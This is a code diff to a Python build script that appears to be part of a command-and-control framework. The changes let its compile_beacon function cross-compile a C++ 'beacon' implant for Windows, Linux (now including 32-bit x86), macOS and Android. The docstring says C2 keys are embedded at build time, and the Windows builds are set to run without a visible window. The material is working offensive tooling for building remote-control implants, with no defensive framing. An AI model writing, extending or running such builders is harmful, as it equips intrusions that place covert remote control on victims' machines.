@@ -15,6 +15,7 @@ _PLATFORM_OUT = {
     "linux": "beacon_linux",
     "macos": "beacon_macos",
     "android": "beacon_android",
+    "linux32": "beacon_linux_x86",
 }
 
 
@@ -40,18 +41,24 @@ def _mark_built(beacon_dir: str, out_name: str) -> None:
         f.write(crypto_fingerprint())
 
 
-def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) -> Optional[str]:
+def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64") -> Optional[str]:
     """
-    Compiles the C++ beacon for the specified platform.
+    Compiles the C++ beacon for the specified platform and architecture.
     Embeds C2 keys from environment into crypto_config.h at build time.
     Returns the path to the compiled binary or None on failure.
     """
-    if not check_build_env(platform):
-        notifier.error(f"Build environment not ready for {platform}.")
+    if not check_build_env(platform, arch):
+        notifier.error(f"Build environment not ready for {platform} ({arch}).")
         return None
 
     beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
-    out_name = _PLATFORM_OUT.get(platform)
+    
+    # Architecture-aware output name
+    if platform == "linux" and arch == "x86":
+        out_name = _PLATFORM_OUT["linux32"]
+    else:
+        out_name = _PLATFORM_OUT.get(platform)
+        
     if not out_name:
         notifier.error(f"Unknown platform: {platform}")
         return None
@@ -64,24 +71,25 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) ->
     write_beacon_crypto_config(beacon_dir)
 
     if platform == "windows":
-        console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
+        console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
         try:
             if os.name == 'nt':
                 if not shutil.which("cl"):
                     notifier.error("'cl.exe' (MSVC) not found.")
                     return None
+                # Note: arch selection for MSVC usually depends on which vcvarsall.bat was run.
                 subprocess.run(
-                    ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
+                    ["cl", "/EHsc", "/O2", "/std:c++20", "src/main.cpp", f"/Fe:{out_name}",
                      "/I", "src",
                      "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "/SUBSYSTEM:WINDOWS"],
                     cwd=beacon_dir, check=True, capture_output=True, text=True)
             else:
-                mingw_cpp = "x86_64-w64-mingw32-g++"
+                mingw_cpp = "x86_64-w64-mingw32-g++" if arch == "x64" else "i686-w64-mingw32-g++"
                 if not shutil.which(mingw_cpp):
                     notifier.error(f"'{mingw_cpp}' not found for cross-compilation.")
                     return None
                 subprocess.run(
-                    [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
+                    [mingw_cpp, "-std=c++20", "-O2", "-s", "-o", out_name,
                      "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32", "-static", "-mwindows"],
                     cwd=beacon_dir, check=True, capture_output=True, text=True)
             _mark_built(beacon_dir, out_name)
@@ -91,12 +99,14 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) ->
             return None
 
     elif platform == "linux":
-        console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
+        console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
         try:
-            subprocess.run(
-                ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux",
-                 "-Isrc", "src/main.cpp", "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
-                cwd=beacon_dir, check=True, capture_output=True, text=True)
+            cmd = ["g++", "-std=c++20", "-O2", "-s", "-o", out_name,
+                   "-Isrc", "src/main.cpp", "-lcurl", "-lssl", "-lcrypto", "-lpthread"]
+            if arch == "x86":
+                cmd.insert(1, "-m32")
+                
+            subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
             _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
@@ -117,7 +127,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) ->
                 include_flags.append(f"-isysroot{sdk_path}")
 
             subprocess.run(
-                [o32_cc, "-std=c++17", "-O2", "-o", "beacon_macos",
+                [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
                  *include_flags, "src/main.cpp",
                  "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True)
@@ -140,7 +150,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) ->
             ndk_include = os.path.join(ndk_sysroot, "usr", "include")
             ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
             subprocess.run(
-                [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android",
+                [ndk_cc, "-std=c++20", "-O2", "-s", "-o", "beacon_android",
                  "-Isrc", "src/main.cpp",
                  f"--sysroot={ndk_sysroot}",
                  f"-I{ndk_include}",
